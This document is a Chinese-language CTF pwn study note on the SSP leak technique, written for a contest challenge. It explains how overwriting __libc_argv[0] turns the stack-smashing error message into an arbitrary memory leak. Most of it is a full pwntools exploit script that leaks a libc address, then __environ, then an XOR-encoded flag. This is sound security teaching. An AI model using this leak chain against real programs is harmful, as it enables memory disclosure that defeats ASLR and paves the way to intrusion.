## SSP攻击

[CTF-pwn 技术总结（3）](https://sf2333.github.io/2022/02/01/CTF-pwn-%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%883%EF%BC%89/)

[SSP leak - 先知社区](https://xz.aliyun.com/t/12672)

```python
p &__libc_argv[0] #用于查找到__libc_argv[0]的地址，在ssp攻击中很常用
```

华为杯研究生比赛中遇到的一道题，关于ssp攻击

ssp攻击主要是利用了这个原理：在包含canary的二进制文件，如果检测到了canary被修改，那么会直接输出此二进制文件名

![Untitled](Untitled%204.png)

二进制文件名存贮在`__libc_argv[0]`中，所以只要我们覆盖了这个地址，就可以直接进行任意地址泄露

同时，在libc中有一个变量，叫做`__environ`，这个变量储存着此时栈的地址，并且指向的地址是`__libc_argv[0]+0x10`

```python
from pwn import *
from LibcSearcher import *
#context.log_level = 'debug'

arg_0 = 0x7fffffffe328
what_to_do = 0x7fffffffe200
ebp = 0x7fffffffe1f0

sh = process("./pwn")
#sh = remote("172.10.0.4","10085")
elf = ELF("./pwn")
libc = ELF("./libc-2.23.so")
what_to_do - ebp-0x40
en_flag = ebp - 0xa4
offset = arg_0 -what_to_do

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

#sh = remote("172.10.0.4","10085")
payload =  cyclic(offset)+p64(puts_got)
# first
sh.recvuntil(b"What's your name?\n")
sh.sendline(b'aaaa')

sh.recvuntil(b"What do you want to do?\n")
sh.sendline(payload)

sh.recvuntil(b"detected ***:")
puts_addr = u64(sh.recvuntil(b" terminated\n",drop = True)[-6:].ljust(8,b"\x00"))

print(hex(puts_addr))

libc_base = puts_addr - libc.sym["puts"]

print(hex(libc_base))	
# second
sh.recvuntil(b"What's your name?\n")
sh.sendline(b'aaaa')

sh.recvuntil(b"What do you want to do?\n")

payload = cyclic(offset)+p64(libc_base + libc.sym['__environ'])
sh.sendline(payload)

sh.recvuntil(b"detected ***:")
environ_addr = u64(sh.recvuntil(b" terminated\n",drop = True)[-6:].ljust(8,b"\x00"))

print(hex(environ_addr))
	
# third
print("3")
sh.recvuntil(b"What's your name?\n")
sh.sendline(b'aaaa')
rand_id = int(sh.recvuntil(b"\n",drop = True)[-2:])

print(rand_id)

sh.recvuntil(b"What do you want to do?\n")
#gdb.attach(sh)
#pause()
payload = cyclic(offset)+p64(environ_addr-376)
print("addr:")
print(hex(environ_addr-376))
sh.sendline(payload)

sh.recvuntil(b"detected ***:")
flag = sh.recvuntil(b" terminated\n",drop = True)
print(flag)

new_flag = b''

for i in flag:
	new_flag+=bytes([i ^ rand_id])
	
print(new_flag)
sh.interactive()
```

![Untitled](Untitled%205.png)
